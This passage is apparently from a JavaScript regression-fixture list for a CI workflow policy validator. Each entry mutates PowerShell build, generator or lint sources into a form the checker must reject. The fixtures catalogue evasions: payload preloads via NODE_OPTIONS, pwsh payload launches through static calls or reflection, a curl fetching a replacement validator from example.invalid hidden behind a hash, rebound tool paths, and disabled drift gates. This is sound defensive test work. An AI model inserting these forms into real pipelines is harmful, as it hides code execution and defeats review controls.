  ['T1-MARKDOWN-083', 'Node preload configured through the braced Env spelling', 'markdown', (source) => replaceOnce(source, '          $boolCiExisted = Test-Path Env:CI\n', "          ${env:NODE_OPTIONS} = '--require=./payload.cjs'\n          $boolCiExisted = Test-Path Env:CI\n")],
  ['T1-MARKDOWN-084', 'braced Env spelling in the lint job', 'markdown', (source) => replaceLast(source, '          $boolCiExisted = Test-Path Env:CI\n', "          ${env:NODE_OPTIONS} = '--require=./payload.cjs'\n          $boolCiExisted = Test-Path Env:CI\n")],
  // Names no command at command position and uses no call operator, so both the
  // allowlist and the bare-command scan are structurally blind to it. The
  // assembled argument also defeats the raw-text separation rule.
  ['T1-MARKDOWN-085', 'package script launched through the process API in the policy job', 'markdown', (source) => replaceOnce(source, '          $boolCiExisted = Test-Path Env:CI\n', "          [System.Diagnostics.Process]::Start($strNpmPath, ('run lint:' + 'md')).WaitForExit()\n          $boolCiExisted = Test-Path Env:CI\n")],
  // Deliberately not `Invoke-Expression …` at statement start: that names a
  // command at command position and the allowlist catches it first, correctly.
  // This is the form that names nothing there, which is what this rule is for.
  ['T1-MARKDOWN-086', 'command string executed through a script block in the lint job', 'markdown', (source) => replaceLast(source, '          $boolCiExisted = Test-Path Env:CI\n', "          [scriptblock]::Create('npm run lint:' + 'md').Invoke()\n          $boolCiExisted = Test-Path Env:CI\n")],
  // Round 48. The hash sits inside an argument token, so PowerShell does not
  // start a comment there and the curl after the semicolon runs. Before the
  // projection was corrected this whole suffix was blanked and the step was
  // accepted; the same line without the # was already rejected.
  ['T1-MARKDOWN-087', 'request hidden behind a hash inside an argument token', 'markdown', (source) => replaceOnce(source, "          $strNodeUrl = 'https://nodejs.org", "          Write-Host marker#text; /usr/bin/curl -o ./Validate-WorkflowPolicy.mjs https://example.invalid/v\n          $strNodeUrl = 'https://nodejs.org")],
  // Round 49. The same hiding place reached through escaped whitespace: a
  // backtick makes the space or tab literal, so it never ended the token and
  // the # is still inside the argument. Built with fromCharCode so this file
  // does not carry a raw backtick in a fixture string.
  ['T1-MARKDOWN-088', 'request hidden behind an escaped space before a hash', 'markdown', (source) => replaceOnce(source, "          $strNodeUrl = 'https://nodejs.org", "          Write-Host marker" + String.fromCharCode(96) + " #text; /usr/bin/curl -o ./Validate-WorkflowPolicy.mjs https://example.invalid/v\n          $strNodeUrl = 'https://nodejs.org")],
  ['T1-MARKDOWN-089', 'request hidden behind an escaped tab before a hash', 'markdown', (source) => replaceOnce(source, "          $strNodeUrl = 'https://nodejs.org", "          Write-Host marker" + String.fromCharCode(96) + String.fromCharCode(9) + "#text; /usr/bin/curl -o ./Validate-WorkflowPolicy.mjs https://example.invalid/v\n          $strNodeUrl = 'https://nodejs.org")],
  // Round 50. Smart quotes are string delimiters to PowerShell but not to the
  // projection, so this decoy stayed visible as code and satisfied both
  // qualified-lookup presence checks while evaluating to a String. Built from
  // fromCharCode so this file stays ASCII itself.
  ['T1-GENERATOR-010', 'qualified lookup satisfied by a smart-quoted decoy', 'generator', (source) => replaceOnce(source, '    $strGitPath = [string]$arrGitCommands[0].Source', "    $strDecoy = " + String.fromCharCode(0x201C) + "Microsoft.PowerShell.Core" + String.fromCharCode(92) + "Get-Command -Name git" + String.fromCharCode(0x201D) + "\n    $strGitPath = [string]$arrGitCommands[0].Source")],
  // The approved lookup still runs; only its result stops being what is
  // invoked. Every later & $strGitPath then resolves 'git' the ordinary way.
  ['T1-GENERATOR-011', 'Git path rebound to a bare command name', 'generator', (source) => replaceOnce(source, '    $strGitPath = [string]$arrGitCommands[0].Source', "    $strGitPath = 'git'")],
  ['T1-GENERATOR-012', 'Git path reassigned after the qualified lookup', 'generator', (source) => replaceOnce(source, '    $arrOutput = @(& $strGitPath', "    $strGitPath = 'git'\n    $arrOutput = @(& $strGitPath")],
  // Round 51, reported: an indirect writer the = count could not see.
  ['T1-GENERATOR-013', 'Git path rebound through an indirect variable writer', 'generator', (source) => replaceOnce(source, '    $strGitPath = [string]$arrGitCommands[0].Source', "    $strGitPath = [string]$arrGitCommands[0].Source\n    Set-Variable -Name strGitPath -Value 'git'")],
  // Round 51, reported: exits successfully before defining or running anything,
  // leaving all four artifacts stale under a green build.
  ['T1-GENERATOR-014', 'generator returns at the top level before dispatching', 'generator', (source) => replaceOnce(source, '$hashtableSourceMap = [ordered]@{', "return\n$hashtableSourceMap = [ordered]@{")],
  // Round 51, found by battery rather than reported: the safety assertions had
  // no named enforcement at all, only the digest.
  ['T1-GENERATOR-015', 'tracked-destination identity check no longer called', 'generator', (source) => replaceOnce(source, '        Assert-TrackedFile -RepositoryRoot $strRepositoryRoot -RepositoryPath $strRepositoryPath\n', '')],
  ['T1-GENERATOR-016', 'tracked-destination check short-circuited before its lookup', 'generator', (source) => replaceOnce(source, "    $arrGitCommands = @(Microsoft.PowerShell.Core", "    if ($true) { return }\n    $arrGitCommands = @(Microsoft.PowerShell.Core")],
  ['T1-GENERATOR-017', 'tracked-path comparison case-folded', 'generator', (source) => replaceOnce(source, '$arrOutput[0] -cne $RepositoryPath', '$arrOutput[0] -ine $RepositoryPath')],
  ['T1-GENERATOR-018', 'closed candidate byte check removed', 'generator', (source) => replaceOnce(source, "            throw 'candidate-byte-mismatch'\n", '')],
  ['T1-GENERATOR-019', 'atomic replace swapped for a non-atomic write', 'generator', (source) => replaceOnce(source, '            [TerraformStyleGuide.AtomicFileReplacement]::Replace($strTemporaryPath, $strDestinationPath)', '            [System.IO.File]::Copy($strTemporaryPath, $strDestinationPath, $true)')],
  // Found by running the round-51 battery against build.verify. Its drift check
  // pins a whole condition and survived; these four neighbours did not.
  ['T1-BUILD-140', 'generator no longer bounded to the four artifact paths', 'build', (source) => replaceOnce(source, '              if ($arrOutside.Count -ne 0) {', '              if ($false -and $arrOutside.Count -ne 0) {')],
  ['T1-BUILD-141', 'artifact membership test case-folded', 'build', (source) => replaceOnce(source, '$arrArtifacts -cnotcontains $_', '$arrArtifacts -inotcontains $_')],
  ['T1-BUILD-142', 'changed-path ordering no longer case-sensitive', 'build', (source) => replaceOnce(source, '| Sort-Object -CaseSensitive)', '| Sort-Object)')],
  // The worst of the four: without the sanity check a failing git diff has an
  // exit code that is neither 0 nor 1, falls past the drift branch, and reads
  // as "no drift".
  ['T1-BUILD-143', 'diff exit-code sanity check short-circuited', 'build', (source) => replaceOnce(source, '          if ($objDiff.ExitCode -ne 0 -and $objDiff.ExitCode -ne 1) {', '          if ($false -and $objDiff.ExitCode -ne 0 -and $objDiff.ExitCode -ne 1) {')],
  // Round 52. Four walks through the round-51 dispatch rule, which matched a
  // wildcard family and counted four rather than pinning the sequence.
  ['T1-GENERATOR-020', 'complete payload computation removed', 'generator', (source) => replaceOnce(source, '    $hashtablePayloads = New-StyleGuidePayloadMap `\n', '    $hashtablePayloads = [ordered]@{} # payload computation removed\n')],
  ['T1-GENERATOR-021', 'pre-publication failure status removed', 'generator', (source) => replaceOnce(source, "            $hashtableRecord.Status = 'Failed'\n", '')],
  ['T1-GENERATOR-022', 'successful exit inserted before publication', 'generator', (source) => replaceOnce(source, "    $strResultPhase = 'replace-artifacts'\n", "    exit 0\n    $strResultPhase = 'replace-artifacts'\n")],
  ['T1-GENERATOR-023', 'publication loop wrapped in a block that never runs', 'generator', (source) => replaceOnce(replaceOnce(source, "    $strResultPhase = 'replace-artifacts'\n", "    if ($false) {\n    $strResultPhase = 'replace-artifacts'\n"), '    $boolAnyReplacement = @($listArtifactRecords', '    }\n    $boolAnyReplacement = @($listArtifactRecords')],
  // Self-review, not reported: round 52's lesson applied to the guard lists I
  // had just written. Counting a guard does not make it run.
  ['T1-GENERATOR-024', 'result schema identity removed', 'generator', (source) => replaceOnce(source, "$script:strGeneratorResultSchema = 'TerraformStyleGuide.GeneratorResult.v2'\n", '')],
  // The LAST of three copies, not the first. Checking only the first
  // occurrence's depth was the defect this fixture exists to hold closed: the
  // count stayed exact, the first copy stayed at its reviewed depth, and the
  // third could be made unreachable.
  ['T1-GENERATOR-025', 'proved candidate cleanup deletion removed', 'generator', (source) => replaceOnce(source, '                        [System.IO.File]::Delete($strTemporaryPath)\n', '')],
  ['T1-GENERATOR-026', 'generator edited without re-review', 'generator', (source) => `${source}\n# unreviewed edit\n`],
  // Round 53, both halves as reported, then the three the class turned out to
  // also contain. Each was measured accepted before the rule existed, and each
  // was confirmed in PowerShell to rebind the variable the reviewed invocation
  // reads -- the invocation site returned 'git' instead of the resolved path.
  ['T1-GENERATOR-027', 'Git path rebound through a call-operator alias', 'generator', (source) => replaceOnce(source, '    $strGitPath = [string]$arrGitCommands[0].Source\n', "    $strGitPath = [string]$arrGitCommands[0].Source\n    & sv strGitPath 'git'\n")],
  // Quoted, so adding an `&` alternative to the command-position anchor would
  // not have caught it: that anchor captures a token starting with a letter.
  ['T1-GENERATOR-028', 'Git path rebound through a quoted call-operator target', 'generator', (source) => replaceOnce(source, '    $strGitPath = [string]$arrGitCommands[0].Source\n', "    $strGitPath = [string]$arrGitCommands[0].Source\n    & 'sv' strGitPath 'git'\n")],
  // The other invocation operator. Dot-sourcing runs in the current scope, so
  // it rebinds exactly as & does; closing & alone left this open.
  ['T1-GENERATOR-029', 'Git path rebound through the dot-source operator', 'generator', (source) => replaceOnce(source, '    $strGitPath = [string]$arrGitCommands[0].Source\n', "    $strGitPath = [string]$arrGitCommands[0].Source\n    . sv strGitPath 'git'\n")],
  ['T1-GENERATOR-030', 'Git path rebound through a scope-qualified assignment', 'generator', (source) => replaceOnce(source, '    $strGitPath = [string]$arrGitCommands[0].Source\n', "    $strGitPath = [string]$arrGitCommands[0].Source\n    $local:strGitPath = 'git'\n")],
  // Braced and upper-case, together: the modifier list a spelling-based fix
  // would have written needs both spellings and case folding to catch this one.
  ['T1-GENERATOR-031', 'Git path rebound through a braced qualified assignment', 'generator', (source) => replaceOnce(source, '    $strGitPath = [string]$arrGitCommands[0].Source\n', "    $strGitPath = [string]$arrGitCommands[0].Source\n    ${PRIVATE:strGitPath} = 'git'\n")],
  // The reviewed invocation kept, counted, and unreachable. Balanced, for the
  // reason T1-BUILD-144 records: an unclosed brace shifts every later depth and
  // the suite then reports whichever check comes next rather than this one.
  // Round 54. PowerShell variable names are case-insensitive -- measured, the
  // invocation site read `git` -- and every count here compared them exactly.
  ['T1-GENERATOR-033', 'Git path rebound through a case-variant assignment', 'generator', (source) => replaceOnce(source, '    $strGitPath = [string]$arrGitCommands[0].Source\n', "    $strGitPath = [string]$arrGitCommands[0].Source\n    $STRGITPATH = 'git'\n")],
  // Round 55. A backtick continues the statement across the newline, so this is
  // one assignment that every write pattern here read as none.
  ['T1-GENERATOR-034', 'Git path rebound across a line continuation', 'generator', (source) => replaceOnce(source, '    $strGitPath = [string]$arrGitCommands[0].Source\n', "    $strGitPath = [string]$arrGitCommands[0].Source\n    $strGitPath `\n= 'git'\n")],
  // Every reviewed statement present, once, in order, at depth zero -- and the
  // artifacts restored to their committed bytes afterwards through the
  // already-allowlisted writer.
  ['T1-GENERATOR-035', 'artifacts rewritten after the reviewed dispatch', 'generator', (source) => replaceOnce(source, 'Write-GeneratorResult -Result $hashtableResult\nexit $intExitCode', "Write-GeneratorResult -Result $hashtableResult\nWrite-StyleGuideArtifact -DestinationLeaf 'STYLE_GUIDE_FULL.md' -Content ''\nexit $intExitCode")],
  ['T1-GENERATOR-032', 'reviewed invocation kept but made unreachable', 'generator', (source) => replaceOnce(source, '    $arrOutput = @(& $strGitPath -C $RepositoryRoot ls-files --error-unmatch -- $RepositoryPath 2>$null)\n    $intGitExit = $LASTEXITCODE\n', '    if ($false) {\n    $arrOutput = @(& $strGitPath -C $RepositoryRoot ls-files --error-unmatch -- $RepositoryPath 2>$null)\n    }\n    $intGitExit = $LASTEXITCODE\n')],
  ['T1-BUILD-144', 'outside-paths drift guard kept but made unreachable', 'build', (source) => replaceOnce(replaceOnce(source, '              if ($arrOutside.Count -ne 0) {', '              if ($false) { if ($arrOutside.Count -ne 0) {'), '                  throw "git-state: the generator changed $($arrOutside.Count) path(s) outside the four generated artifacts"\n              }\n', '                  throw "git-state: the generator changed $($arrOutside.Count) path(s) outside the four generated artifacts"\n              } }\n')],
  // Round 53, found by extending the reported finding rather than reported. The
  // guards prove the control-surface comparison is present and reachable; this
  // re-records the value it reads after the generator has run, so the gate
  // compares the post-generator state against itself. The plain spelling,
  // deliberately: here no count existed at all, so this is not the reported
  // spelling class and a fix aimed at spellings would have changed nothing.
  ['T1-BUILD-145', 'control-surface digest re-recorded before its own gate', 'build', (source) => replaceOnce(source, '          $strControlSurfaceBefore = Get-GitControlSurfaceDigest\n', '          $strControlSurfaceBefore = Get-GitControlSurfaceDigest\n          $strControlSurfaceBefore = Get-GitControlSurfaceDigest\n')],
  ['T1-BUILD-146', 'worktree baseline re-recorded through a qualified write', 'build', (source) => replaceOnce(source, '          $strControlSurfaceBefore = Get-GitControlSurfaceDigest\n', '          $strControlSurfaceBefore = Get-GitControlSurfaceDigest\n          $local:objWorktreeBefore = @{}\n')],
  // Round 54, reported. The authoritative accumulator was missing from the
  // single-assignment list, so emptying it immediately before its own gate
  // disabled the byte-level drift check with every other assertion satisfied.
  ['T1-BUILD-147', 'changed-path accumulator emptied before its gate', 'build', (source) => replaceOnce(source, '          if ($listChanged.Count -ne 0) {', '          $listChanged = @()\n          if ($listChanged.Count -ne 0) {')],
  // Case-variant of the same class, on a different protected name.
  ['T1-BUILD-148', 'control-surface digest re-recorded through a case variant', 'build', (source) => replaceOnce(source, '          $strControlSurfaceBefore = Get-GitControlSurfaceDigest\n', '          $strControlSurfaceBefore = Get-GitControlSurfaceDigest\n          $STRCONTROLSURFACEBEFORE = Get-GitControlSurfaceDigest\n')],
  // A mutation, not an assignment: every name stays bound exactly once while
  // both sides of the byte comparison come to describe the post-generator tree.
  ['T1-BUILD-149', 'measured worktree map mutated in place', 'build', (source) => replaceOnce(source, '          $objWorktreeAfter = Get-WorktreeFileDigestMap\n', '          $objWorktreeAfter = Get-WorktreeFileDigestMap\n          $objWorktreeBefore.Clear()\n')],
  // Round 54, found by re-running the round-53 batteries against the round-54
  // fix. Each writes a measured value without assigning it, so no count moves.
  ['T1-BUILD-150', 'measured value rebound through a call-operator alias', 'build', (source) => replaceOnce(source, '          $strControlSurfaceBefore = Get-GitControlSurfaceDigest\n', "          $strControlSurfaceBefore = Get-GitControlSurfaceDigest\n          & sv strControlSurfaceBefore 'x'\n")],
  ['T1-BUILD-151', 'measured value rebound through a bare alias', 'build', (source) => replaceOnce(source, '          $strControlSurfaceBefore = Get-GitControlSurfaceDigest\n', "          $strControlSurfaceBefore = Get-GitControlSurfaceDigest\n          sv strControlSurfaceBefore 'x'\n")],
  ['T1-BUILD-152', 'measured value rebound through the Variable provider', 'build', (source) => replaceOnce(source, '          $strControlSurfaceBefore = Get-GitControlSurfaceDigest\n', "          $strControlSurfaceBefore = Get-GitControlSurfaceDigest\n          Set-Item -Path 'variable:strControlSurfaceBefore' -Value 'x'\n")],
  ['T1-BUILD-153', 'a third constant bound outside the reviewed pair', 'build', (source) => replaceOnce(source, '          $strControlSurfaceBefore = Get-GitControlSurfaceDigest\n', "          $strControlSurfaceBefore = Get-GitControlSurfaceDigest\n          New-Variable -Name strEvil -Value 'x' -Option Constant\n")],
  // Round 55. The member closure named the variable and read what followed it,
  // so a braced reference and an alias both walked past it -- the second found
  // by attacking that rule rather than by report.
  ['T1-BUILD-154', 'drift accumulator emptied through a braced reference', 'build', (source) => replaceOnce(source, '          if ($listChanged.Count -ne 0) {', '          ${listChanged}.Clear()\n          if ($listChanged.Count -ne 0) {')],
  ['T1-BUILD-155', 'measured map mutated through an alias', 'build', (source) => replaceOnce(source, '          $objWorktreeAfter = Get-WorktreeFileDigestMap\n', '          $objWorktreeAfter = Get-WorktreeFileDigestMap\n          $objAlias = $objWorktreeBefore\n')],
  // Neither a call operator nor a bare command token, so no rule here saw it.
  ['T1-BUILD-156', 'process launched through a static call', 'build', (source) => replaceOnce(source, '          $strControlSurfaceBefore = Get-GitControlSurfaceDigest\n', "          [System.Diagnostics.Process]::Start('pwsh', '-NoProfile -File ./payload.ps1')\n          $strControlSurfaceBefore = Get-GitControlSurfaceDigest\n")],
  // Round 56. A backtick is a line continuation only when it is the FINAL
  // character before the newline and its run is odd -- so neither of these two
  // is one, and folding them anyway hid the bare command on the next line from
  // every rule anchored at the start of a line. Both measured accepted before.
  // The payload sits AFTER the generator on purpose: before it, the fold moves
  // the reviewed invocation's line and the suite reports that instead.
  ['T1-BUILD-157', 'bare command hidden behind a backtick with a trailing space', 'build', (source) => replaceOnce(source, '          $objWorktreeAfter = Get-WorktreeFileDigestMap', '          $null = 0` \n          pwsh -NoProfile -File ./payload.ps1\n          $objWorktreeAfter = Get-WorktreeFileDigestMap')],
  ['T1-BUILD-158', 'bare command hidden behind an escaped backtick pair', 'build', (source) => replaceOnce(source, '          $objWorktreeAfter = Get-WorktreeFileDigestMap', '          $null = 0``\n          pwsh -NoProfile -File ./payload.ps1\n          $objWorktreeAfter = Get-WorktreeFileDigestMap')],
  // Round 56, reported: no literal member for the pattern to read.
  ['T1-BUILD-159', 'process launched through a computed static member', 'build', (source) => replaceOnce(source, '          $strControlSurfaceBefore = Get-GitControlSurfaceDigest\n', "          $strMethod = 'Start'\n          [System.Diagnostics.Process]::$strMethod('pwsh', '-NoProfile -File ./payload.ps1')\n          $strControlSurfaceBefore = Get-GitControlSurfaceDigest\n")],
  // Round 56, found attacking the fix for the one above: a type held in a
  // variable reaches `::` with no `]` for the pattern to anchor on at all.
  ['T1-BUILD-160', 'process launched through a type held in a variable', 'build', (source) => replaceOnce(source, '          $strControlSurfaceBefore = Get-GitControlSurfaceDigest\n', "          $typHandle = [System.Diagnostics.Process]\n          $typHandle::Start('pwsh', '-NoProfile -File ./payload.ps1')\n          $strControlSurfaceBefore = Get-GitControlSurfaceDigest\n")],
  // The same walk reached all five governed surfaces, so it is held closed on
  // each of them. The acquire steps are byte-identical, so all three move.
  ['T1-BUILD-161', 'acquire writes the validator through a type held in a variable', 'build', (source) => source.split('          & $strGitPath init --quiet .').join("          $typHandle = [System.IO.File]\n          $typHandle::Copy('./payload', './.github/workflows/Validate-WorkflowPolicy.mjs')\n          & $strGitPath init --quiet .")],
  ['T1-GENERATOR-036', 'generator reaches a static member through a type held in a variable', 'generator', (source) => replaceOnce(source, '    $strGitPath = [string]$arrGitCommands[0].Source', "    $typHandle = [System.IO.File]\n    $typHandle::Copy('./payload', './STYLE_GUIDE.md')\n    $strGitPath = [string]$arrGitCommands[0].Source")],
  ['T1-MARKDOWN-096', 'validate step reaches a static member through a type held in a variable', 'markdown', (source) => replaceOnce(source, '          $intPolicyExit = $LASTEXITCODE', "          $typHandle = [System.IO.File]\n          $typHandle::Copy('./payload', './Validate-WorkflowPolicy.mjs')\n          $intPolicyExit = $LASTEXITCODE")],
  // The irreducible form of the same walk: instance reflection on a type
  // literal, needing no variable to hold it and containing no `::` at all. This
  // is the fixture that says the rule is about the type VALUE, not about `::`.
  ['T1-BUILD-162', 'static member reached by reflection on a type literal', 'build', (source) => replaceOnce(source, '          $strControlSurfaceBefore = Get-GitControlSurfaceDigest\n', "          [System.Diagnostics.Process].GetMethod('Start').Invoke($null, @('pwsh', '-NoProfile -File ./payload.ps1'))\n          $strControlSurfaceBefore = Get-GitControlSurfaceDigest\n")],
  // The walk that survived the two rules above: a Type obtained from a CALL
  // rather than from a literal. Placed on the generator because that is one of
  // the two surfaces with no callee allowlist to catch GetType on its own.
  ['T1-GENERATOR-037', 'generator reaches a static member through a type obtained by reflection', 'generator', (source) => replaceOnce(source, '    $strGitPath = [string]$arrGitCommands[0].Source', "    [System.Type]::GetType('System.Diagnostics.Process').GetMethod('Start').Invoke($null, @('pwsh', '-NoProfile'))\n    $strGitPath = [string]$arrGitCommands[0].Source")],
  // Balanced deliberately. An unclosed `if ($false) {` shifts the depth of every
  // later gate too, so the suite would report whichever gate happens to come
  // next rather than the one this fixture is about.
  ['T1-MARKDOWN-090', 'lint asset supply gate kept but made unreachable', 'markdown', (source) => replaceOnce(source, "          if ($strLintConfigHash -cne $strReviewedLintConfigHash -or $strLintHelperHash -cne $strReviewedLintHelperHash) {\n              throw 'supply: lint configuration or helper does not match the reviewed digest'\n          }\n", "          if ($false) {\n          if ($strLintConfigHash -cne $strReviewedLintConfigHash -or $strLintHelperHash -cne $strReviewedLintHelperHash) {\n              throw 'supply: lint configuration or helper does not match the reviewed digest'\n          }\n          }\n")],
  // Round 53. The reported defect was in the generator's count; this is the
  // same defect in the count here, which the report did not reach and I had not
  // checked. Both measured accepted before these rules existed.
  ['T1-MARKDOWN-091', 'captured phase status zeroed through a scope-qualified write', 'markdown', (source) => replaceOnce(source, '          $intPolicyExit = $LASTEXITCODE\n', "          $intPolicyExit = $LASTEXITCODE\n          $local:intPolicyExit = 0\n")],
  // Round 46 made the braced correction for ${env:NAME} and round 53 made it
  // again for ${strGitPath}. This is the third place it was owed.
  ['T1-MARKDOWN-092', 'captured phase status zeroed through a braced write', 'markdown', (source) => replaceOnce(source, '          $intPolicyExit = $LASTEXITCODE\n', "          $intPolicyExit = $LASTEXITCODE\n          ${intPolicyExit} = 0\n")],
  ['T1-MARKDOWN-093', 'captured lint status zeroed through a scope-qualified write', 'markdown', (source) => replaceOnce(source, '          $intNestedExit = $LASTEXITCODE\n', "          $intNestedExit = $LASTEXITCODE\n          $private:intOuterExit = 0\n")],
  // Round 54, reported. Neither spelling is a plain lower-case `=`, and both
  // zero the captured status -- confirmed in PowerShell.
  ['T1-MARKDOWN-094', 'captured phase status zeroed through a compound assignment', 'markdown', (source) => replaceOnce(source, '          $intPolicyExit = $LASTEXITCODE\n', '          $intPolicyExit = $LASTEXITCODE\n          $intPolicyExit -= $intPolicyExit\n')],
  ['T1-MARKDOWN-095', 'captured phase status zeroed through a case variant', 'markdown', (source) => replaceOnce(source, '          $intPolicyExit = $LASTEXITCODE\n', '          $intPolicyExit = $LASTEXITCODE\n          $INTPOLICYEXIT = 0\n')],
  ['T1-MARKDOWN-072', 'supply prelude closed twice, shortening the compared region', 'markdown', (source) => replaceOnce(source, "          $strGlobalConfigDirectory = [System.IO.Path]::GetDirectoryName($env:npm_config_globalconfig)\n          if ($strGlobalConfigDirectory -cne '/etc') {\n              throw 'supply: the neutralized global npm configuration is not under a root-owned directory'\n          }\n", "          $strGlobalConfigDirectory = [System.IO.Path]::GetDirectoryName($env:npm_config_globalconfig)\n          if ($strGlobalConfigDirectory -cne '/etc') {\n              throw 'supply: the neutralized global npm configuration is not under a root-owned directory'\n          }\n          if ($strGlobalConfigDirectory -cne '/etc') {\n              throw 'supply: the neutralized global npm configuration is not under a root-owned directory'\n          }\n")],
  ['T1-LINTASSET-001', 'all rules disabled in the lint configuration', 'lint-asset', {
    '.markdownlint.jsonc': '{ "default": false }\n',
    'lint-nested-markdown.js': '',
  }],
  ['T1-LINTASSET-002', 'nested-fence helper reduced to a successful no-op', 'lint-asset', {
    'lint-nested-markdown.js': 'process.exit(0);\n',
  }],
  // Round 44, finding A. The parser is the one input this validator cannot
  // check after the fact, because checking is what it is for. The first fixture
  // is the reported attack in miniature: one statement prepended to the entry
  // file, which against the pre-fix validator exited 0 having validated nothing
  // and could print a passing line with a forged digest on its way out.
  ['T1-PARSER-001', 'parser entry file prefixed with a process exit', 'parser-tree', {
    directories: {
      '/yaml': [{ name: 'dist', isDirectory: () => true, isFile: () => false }],
      '/yaml/dist': [{ name: 'index.js', isDirectory: () => false, isFile: () => true }],
    },
    files: { '/yaml/dist/index.js': 'process.exit(0);\n' },
  }],
  // A link is content the digest would read through rather than describe, so
  // the shape is refused before any question of bytes arises.
  ['T1-PARSER-002', 'parser tree containing a symbolic link', 'parser-tree', {
    directories: {
      '/yaml': [{ name: 'dist', isDirectory: () => false, isFile: () => false }],
    },
    files: {},
  }],
  ['T1-NPMRC-001', 'npm configuration beside the governed workflows', 'npm-config', {
    '/repo': [{ name: '.github', isDirectory: () => true }],
    '/repo/.github': [{ name: 'workflows', isDirectory: () => true }],
    '/repo/.github/workflows': [{ name: '.npmrc', isDirectory: () => false }],
  }],
  ['T1-NPMRC-002', 'npm configuration at the repository root', 'npm-config', {
    '/repo': [{ name: '.npmrc', isDirectory: () => false }],
  }],
  ['T1-VERSION-001', 'missing marker', 'version', '<#\n.NOTES\nnone\n#>\nfunction X {}\n'],
  ['T1-VERSION-002', 'duplicate marker', 'version', '<#\n.NOTES\nVersion: 1.0.20260731.0\nVersion: 1.0.20260731.0\n#>\nfunction X {}\n'],
  ['T1-VERSION-003', 'decoy marker', 'version', '<#\n.NOTES\nnone\n#>\nfunction X {}\nVersion: 1.0.20260731.0\n'],
  ['T1-VERSION-004', 'leading zero', 'version', '<#\n.NOTES\nVersion: 01.0.20260731.0\n#>\nfunction X {}\n'],
  ['T1-VERSION-005', 'overflow', 'version', '<#\n.NOTES\nVersion: 2147483648.0.20260731.0\n#>\nfunction X {}\n'],
  ['T1-VERSION-006', 'impossible date', 'version', '<#\n.NOTES\nVersion: 1.0.20260229.0\n#>\nfunction X {}\n'],
  ['T1-VERSION-007', 'future valid but unexpected', 'unexpected-version', '<#\n.NOTES\nVersion: 1.0.20991231.0\n#>\nfunction X {}\n'],
  ['T1-TEXT-001', 'truncated multi-byte sequence', 'text', Buffer.from([0x61, 0x3a, 0x20, 0xe2, 0x82, 0x0a])],
  ['T1-TEXT-002', 'lone continuation byte', 'text', Buffer.from([0x61, 0x3a, 0x20, 0xa1, 0x0a])],
  ['T1-TEXT-003', 'overlong encoding', 'text', Buffer.from([0x61, 0x3a, 0x20, 0xc0, 0xaf, 0x0a])],
  ['T1-TEXT-004', 'lone surrogate', 'text', Buffer.from([0x61, 0x3a, 0x20, 0xed, 0xa0, 0x80, 0x0a])],
  ['T1-TEXT-005', 'UTF-8 BOM', 'text', Buffer.from([0xef, 0xbb, 0xbf, 0x61, 0x3a, 0x20, 0x31, 0x0a])],
  ['T1-TEXT-006', 'carriage return', 'text', Buffer.from([0x61, 0x3a, 0x20, 0x31, 0x0d, 0x0a])],
  ['T1-PACKAGE-001', 'lint script redefined as a no-op', 'package', (pkg, lock) => {
    const parsed = JSON.parse(pkg);
    parsed.scripts['lint:md'] = 'true';
    return [JSON.stringify(parsed, null, 2), lock];
  }],
  ['T1-PACKAGE-002', 'yaml parser dependency loosened', 'package', (pkg, lock) => {
    const parsed = JSON.parse(pkg);
    parsed.devDependencies.yaml = '^2.9.0';
    return [JSON.stringify(parsed, null, 2), lock];
  }],
  ['T1-PACKAGE-003', 'additional script introduced', 'package', (pkg, lock) => {
    const parsed = JSON.parse(pkg);
    parsed.scripts.postinstall = 'node unreviewed.js';
    return [JSON.stringify(parsed, null, 2), lock];
  }],
  ['T1-PACKAGE-004', 'semantically equal but altered manifest bytes', 'package', (pkg, lock) => [`${pkg}\n`, lock]],
  ['T1-PACKAGE-005', 'resolved parser integrity changed', 'package', (pkg, lock) => {
    const parsed = JSON.parse(lock);
    parsed.packages['node_modules/yaml'].integrity = `sha512-${'A'.repeat(86)}==`;
    return [pkg, JSON.stringify(parsed, null, 2)];
  }],
  ['T1-PACKAGE-006', 'lockfile root dependency drift', 'package', (pkg, lock) => {
    const parsed = JSON.parse(lock);
    parsed.packages[''].devDependencies.yaml = '^2.9.0';
    return [pkg, JSON.stringify(parsed, null, 2)];
  }],
  // Cycle 1 GF-HOSTS/GF-GIT repair. These cases are append-only after the 286
  // pre-repair fixtures and bind the authoring contract independently of a
  // reviewed digest re-baseline.
  ['T1-GENERATOR-038', 'generator helper inputs help removed', 'generator', (source) => replaceOnce(source, '    # .INPUTS\n', '    # .INPUT\n')],
  ['T1-GENERATOR-039', 'post-publication uncertainty classification removed', 'generator', (source) => replaceOnce(source, "            $hashtableRecord.Status = 'ReplacementStateUncertain'\n", '')],
  ['T1-BUILD-163', 'embedded Git helper synopsis removed', 'build', (source) => replaceOnce(source, '              # .SYNOPSIS\n              # Invokes the fixed Git executable and captures raw output bytes.\n', '              # .SUMMARY\n              # Invokes the fixed Git executable and captures raw output bytes.\n')],
  ['T1-BUILD-164', 'plural NUL-record helper identity restored', 'build', (source) => source.split('ConvertFrom-NulPathRecordStream').join('ConvertFrom-NulRecords')],
  ['T1-BUILD-165', 'plural allowed-path helper identity restored', 'build', (source) => source.split('Assert-AllowedPathSet').join('Assert-AllowedPaths')],
  ['T1-BUILD-166', 'plural worktree-digest helper identity restored', 'build', (source) => source.split('Get-WorktreeFileDigestMap').join('Get-WorktreeFileDigests')],
  ['T1-BUILD-167', 'async Git copy task result leaks to the success stream', 'build', (source) => replaceOnce(source, '                  [void]$objCopyTask.GetAwaiter().GetResult()\n', '                  $objCopyTask.GetAwaiter().GetResult()\n')],
  ['T1-CLI-001', 'policy CLI receives no arguments', 'cli', []],
  ['T1-CLI-002', 'policy preflight argument is misspelled', 'cli', ['preflight']],
  ['T1-CLI-003', 'policy preflight receives an extra argument', 'cli', ['--preflight', 'build.yml']],
  ['T1-CLI-004', 'policy repository validation receives an extra argument', 'cli', ['build.yml', 'markdownlint.yml', 'extra.yml']],
  // Cycle 2 transactional-publication matrix. Keep these append-only rows in
  // issue-manifest order so each focused failure class maps to one stable ID.
  ['T2-GENERATOR-FILE-001', 'existing tracked ordinary destination loses atomic replacement', 'generator', (source) => replaceOnce(source, '            [TerraformStyleGuide.AtomicFileReplacement]::Replace($strTemporaryPath, $strDestinationPath)', '            [System.IO.File]::Copy($strTemporaryPath, $strDestinationPath, $true)')],
  ['T2-GENERATOR-FILE-002', 'absent tracked destination loses non-overwriting publication', 'generator', (source) => replaceOnce(source, '            [System.IO.File]::Move($strTemporaryPath, $strDestinationPath)\n', '')],
